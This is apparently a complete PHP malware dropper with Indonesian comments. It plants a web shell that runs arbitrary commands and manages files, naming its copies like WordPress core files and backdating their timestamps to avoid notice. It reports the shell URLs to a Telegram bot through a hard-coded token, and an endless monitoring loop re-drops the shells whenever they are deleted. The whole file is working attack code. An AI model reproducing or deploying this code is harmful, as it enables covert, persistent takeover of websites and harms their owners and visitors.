<?php
ignore_user_abort(true);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

$botToken = '8349599623:AAHRR2SwOGvupKc6y6c0WVoyDxp-bwWSQhU';
$chatId = '1383301930';

$domain = $_SERVER['HTTP_HOST'] ?? php_uname();
$shellContent = <<<'PHP'
<?php
ignore_user_abort(true);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$dir || !is_dir($dir)) $dir = getcwd();

// Hapus shell
if (isset($_GET['delete'])) {
    unlink(__FILE__);
    exit("<b>Shell berhasil dihapus!</b>");
}

// Hapus file biasa
if (isset($_GET['deletefile'])) {
    $fileToDelete = realpath($_GET['deletefile']);
    if ($fileToDelete && strpos($fileToDelete, $dir) === 0 && is_file($fileToDelete)) {
        unlink($fileToDelete);
        echo "<p style='color:orange'>File berhasil dihapus: $fileToDelete</p>";
    } else {
        echo "<p style='color:red'>File tidak ditemukan atau tidak bisa dihapus.</p>";
    }
}

// Rename file atau folder
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $oldPath = realpath($_GET['rename']);
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $_POST['newname'];
    if (rename($oldPath, $newPath)) {
        echo "<p style='color:lime'>Rename berhasil!</p>";
    } else {
        echo "<p style='color:red'>Rename gagal!</p>";
    }
}

// Upload banyak file sekaligus
if (isset($_FILES['files'])) {
    foreach ($_FILES['files']['name'] as $key => $name) {
        $tmp_name = $_FILES['files']['tmp_name'][$key];
        $target = $dir . DIRECTORY_SEPARATOR . basename($name);
        if (move_uploaded_file($tmp_name, $target)) {
            echo "<p style='color:lime'>Upload berhasil: " . htmlspecialchars($name) . "</p>";
        } else {
            echo "<p style='color:red'>Upload gagal: " . htmlspecialchars($name) . "</p>";
        }
    }
}

// Upload ZIP dan ekstrak otomatis
if (isset($_FILES['zipfile'])) {
    $zipName = $_FILES['zipfile']['name'];
    $zipTmp = $_FILES['zipfile']['tmp_name'];
    $targetZip = $dir . DIRECTORY_SEPARATOR . basename($zipName);
    
    if (move_uploaded_file($zipTmp, $targetZip)) {
        $zip = new ZipArchive;
        if ($zip->open($targetZip) === TRUE) {
            $zip->extractTo($dir);
            $zip->close();
            echo "<p style='color:lime'>ZIP berhasil diupload dan diekstrak.</p>";
            unlink($targetZip);
        } else {
            echo "<p style='color:red'>Gagal membuka file ZIP.</p>";
        }
    } else {
        echo "<p style='color:red'>Upload file ZIP gagal.</p>";
    }
}

// Edit file
if (isset($_GET['edit'])) {
    $fileToEdit = realpath($_GET['edit']);
    if ($fileToEdit && strpos($fileToEdit, $dir) === 0 && is_file($fileToEdit)) {
        if (isset($_POST['save'])) {
            $newContent = $_POST['content'] ?? '';
            file_put_contents($fileToEdit, $newContent);
            echo "<p style='color:lime'>File berhasil disimpan: $fileToEdit</p>";
        }
        $content = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<h3>Edit File: " . htmlspecialchars(basename($fileToEdit)) . "</h3>";
        echo "<form method='post'>
                <textarea name='content' style='width:100%;height:300px;background:#222;color:#0f0;border:1px solid #555;font-family: monospace;'>" . $content . "</textarea><br>
                <button type='submit' name='save' style='color:white;'>Simpan</button>
                <a href='?dir=" . urlencode($dir) . "' style='margin-left:10px;color:#ccc;'>Batal</a>
              </form>";
        exit;
    } else {
        echo "<p style='color:red'>File tidak ditemukan atau tidak bisa diedit.</p>";
    }
}

// Buat file
if (isset($_POST['newfile'])) {
    $path = $dir . DIRECTORY_SEPARATOR . $_POST['newfile'];
    file_put_contents($path, '');
}

// Buat direktori
if (isset($_POST['newdir'])) {
    $path = $dir . DIRECTORY_SEPARATOR . $_POST['newdir'];
    mkdir($path);
}

// Eksekusi command
$cmdOutput = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $cmdOutput = shell_exec($cmd);
}

$parentDir = dirname($dir);
$scan = scandir($dir);

$dirs = [];
$files = [];
foreach ($scan as $item) {
    if ($item === '.') continue;
    $fullpath = $dir . DIRECTORY_SEPARATOR . $item;
    if (is_dir($fullpath)) $dirs[] = $item;
    else $files[] = $item;
}

// Tampilan
echo "<style>
body{background:#111;color:#fff;font-family:monospace;}
a{color:lime;text-decoration:none;}
table{width:100%; border-collapse: collapse;}
th,td{padding:6px; border:1px solid #333; text-align:left;}
form{margin-top:10px;}
button.deletefile, button.renamefile {
  background: transparent;
  border: none;
  color: white;
  cursor: pointer;
  font-weight: bold;
}
</style>";

echo "<h3>Directory: $dir</h3>";
echo "<a href='?dir=" . urlencode($parentDir) . "'>&larr; Kembali</a><br><br>";

echo "<table><tr><th>Nama</th><th>Ukuran</th><th>Modifikasi</th><th>Permission</th><th>Opsi</th></tr>";
foreach ($dirs as $item) {
    $fullpath = $dir . DIRECTORY_SEPARATOR . $item;
    $perm = substr(sprintf('%o', fileperms($fullpath)), -4);
    echo "<tr>
        <td><a href='?dir=" . urlencode($fullpath) . "'>📁 $item</a></td>
        <td>-</td>
        <td>" . date('Y-m-d H:i', filemtime($fullpath)) . "</td>
        <td>rwxr-xr-x ($perm)</td>
        <td>
            <form method='post' action='?dir=" . urlencode($dir) . "&rename=" . urlencode($fullpath) . "' style='display:inline;'>
                <input name='newname' placeholder='Rename ke...' required>
                <button type='submit' class='renamefile'> Rename</button>
            </form>
        </td>
    </tr>";
}
foreach ($files as $item) {
    $fullpath = $dir . DIRECTORY_SEPARATOR . $item;
    $perm = substr(sprintf('%o', fileperms($fullpath)), -4);
    echo "<tr>
        <td>$item</td>
        <td>" . filesize($fullpath) . " B</td>
        <td>" . date('Y-m-d H:i', filemtime($fullpath)) . "</td>
        <td>rw-r--r-- ($perm)</td>
        <td>
            <a href='?dir=" . urlencode($dir) . "&edit=" . urlencode($fullpath) . "' style='color:white'> Edit</a> | 
            <a href='?dir=" . urlencode($dir) . "&deletefile=" . urlencode($fullpath) . "' onclick=\"return confirm('Yakin mau hapus file ini?');\" style='color:red'>🗑 Hapus</a>
            <form method='post' action='?dir=" . urlencode($dir) . "&rename=" . urlencode($fullpath) . "' style='display:inline;'>
                <input name='newname' placeholder='Rename ke...' required>
                <button type='submit' class='renamefile'> Rename</button>
            </form>
        </td>
    </tr>";
}
echo "</table>";

// Form buat file & folder
echo "<form method='post'>
    <input type='text' name='newfile' placeholder='Nama file baru'>
    <button type='submit'>+ Buat File</button>
</form>
<form method='post'>
    <input type='text' name='newdir' placeholder='Nama folder baru'>
    <button type='submit'>+ Buat Folder</button>
</form>";

// Form upload multiple files
echo "<form method='post' enctype='multipart/form-data' style='margin-top:10px;'>
<label style='color:lime;'>Upload file (banyak sekaligus):</label><br>
<input type='file' name='files[]' multiple required>
<button type='submit'>Upload</button>
</form>";

// Form upload ZIP
echo "<form method='post' enctype='multipart/form-data' style='margin-top:10px;'>
<label style='color:lime;'>Upload file ZIP (akan diekstrak otomatis):</label><br>
<input type='file' name='zipfile' accept='.zip' required>
<button type='submit'>Upload & Extract</button>
</form>";

// Form command
echo "<hr><form method='post'>
    <label style='color:lime'>Execute Command:</label><br>
    <input type='text' name='cmd' style='width:80%; background:#222; color:#fff; border:1px solid #555;' placeholder='Masukkan perintah shell...' autocomplete='off' required>
    <button type='submit'>Run</button>
</form>";
if ($cmdOutput !== '') {
    echo "<pre style='background:#222; color:#0f0; padding:10px; margin-top:10px; white-space: pre-wrap;'>" . htmlspecialchars($cmdOutput) . "</pre>";
}

// Link hapus shell
echo "<br><a href='?delete=true' style='color:red'>🗑 Hapus Shell Ini</a>";
?>
PHP;

function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
    $result = [];
    if ($currentDepth > $maxDepth) return $result;
    $items = @scandir($baseDir);
    if (!$items) return $result;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = rtrim($baseDir, '/') . '/' . $item;
        if (is_dir($fullPath)) {
            if (is_writable($fullPath)) {
                $result[] = $fullPath;
            }
            $result = array_merge($result, scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1));
        }
    }
    return $result;
}

function generateShellName($dir) {
    $wpShells = ['index.php', 'wp-load.php', 'wp-config.php', 'wp-settings.php', 'wp-blog-header.php', 'xmlrpc.php'];
    foreach ($wpShells as $name) {
        $full = rtrim($dir, '/') . '/' . $name;
        if (!file_exists($full)) return $name;
    }
    $typo = 'wp-loaad.php';
    $fullTy = rtrim($dir, '/') . '/' . $typo;
    if (!file_exists($fullTy)) return $typo;
    return 'shell_' . substr(md5(time()), 0, 5) . '.php';
}

function dropAndNotify($shellContent, $botToken, $chatId, $domain) {
    $allWritableDirs = scanWritableDirs(__DIR__, 5);
    $allWritableDirs = array_unique($allWritableDirs);
    shuffle($allWritableDirs);
    $targetDirs = array_slice($allWritableDirs, 0, 5);

    $writtenFiles = [];
    foreach ($targetDirs as $dirTarget) {
        $shellName = generateShellName($dirTarget);
        $targetFile = rtrim($dirTarget, '/') . '/' . $shellName;
        if (!is_dir($dirTarget) || !is_writable($dirTarget)) continue;
        if (file_exists($targetFile)) continue;
        if (@file_put_contents($targetFile, $shellContent)) {
            $wpConfig = rtrim($dirTarget, '/') . '/wp-config.php';
            if (file_exists($wpConfig)) {
                $time = filemtime($wpConfig);
                @touch($targetFile, $time, $time);
            }
            $writtenFiles[] = $targetFile;
        }
    }

    if (!empty($writtenFiles)) {
        $msg = "🔥 Shell berhasil didrop di <b>$domain</b>:\n\n";
        foreach ($writtenFiles as $f) {
            $rel = str_replace(__DIR__, '', $f);
            $url = "https://$domain$rel";
            $msg .= "📍 <a href=\"$url\">$url</a>\n";
        }
        @file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
            'chat_id' => $chatId,
            'text' => $msg,
            'parse_mode' => 'HTML'
        ]));
    }

    return $writtenFiles;
}

function sendTelegram($message) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = http_build_query([
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);
    @file_get_contents("$url?$data");
}

function monitorShellsInfinite($writtenFiles, $botToken, $chatId, $domain, $shellContent) {
    $reported = [];
    $allWritableDirs = scanWritableDirs(__DIR__, 5);

    sendTelegram("🚀 <b>Monitoring dimulai di $domain</b> [PID: ".getmypid()."]");

    while (true) {
        foreach ($writtenFiles as $file) {
            if (!file_exists($file) && !in_array($file, $reported)) {
                $rel = str_replace(__DIR__, '', $file);
                $text = "🚨 Shell dihapus di: <b>$domain</b>\nLokasi: <code>$rel</code>";
                sendTelegram($text);

                $moreWritable = array_diff($allWritableDirs, [$file]);
                shuffle($moreWritable);
                $newTargets = array_slice($moreWritable, 0, 2);
                foreach ($newTargets as $newDir) {
                    $newShellName = generateShellName($newDir);
                    $newFile = rtrim($newDir, '/') . '/' . $newShellName;
                    if (!file_exists($newFile) && is_writable($newDir)) {
                        @file_put_contents($newFile, $shellContent);
                        $msg2 = "♻️ Shell tersebar ulang di: <b>$domain</b>\nLokasi: <code>" . str_replace(__DIR__, '', $newFile) . "</code>";
                        sendTelegram($msg2);
                    }
                }
                $reported[] = $file;
            }
        }
        sleep(10);
    }
}

if (php_sapi_name() === 'cli') {
    $writtenFiles = dropAndNotify($shellContent, $botToken, $chatId, $domain);
    if (empty($writtenFiles)) {
        echo "Gagal drop shell, tidak ada direktori writable.\n";
        exit(1);
    }
    echo "Shell berhasil didrop di direktori writable berikut:\n";
    foreach ($writtenFiles as $file) {
        echo " - $file\n";
    }

    monitorShellsInfinite($writtenFiles, $botToken, $chatId, $domain, $shellContent);
    exit(0);
} else {
    $writtenFiles = dropAndNotify($shellContent, $botToken, $chatId, $domain);
    if (!empty($writtenFiles)) {
        monitorShellsInfinite($writtenFiles, $botToken, $chatId, $domain, $shellContent);

        // Setelah monitoring selesai, hapus shell utama
        unlink(__FILE__);
        echo "<p style='color:lime;'>Monitoring selesai, shell otomatis dihapus.</p>";
    } else {
        echo "<pre>Gagal drop shell, tidak ada direktori writable.</pre>";
    }
}
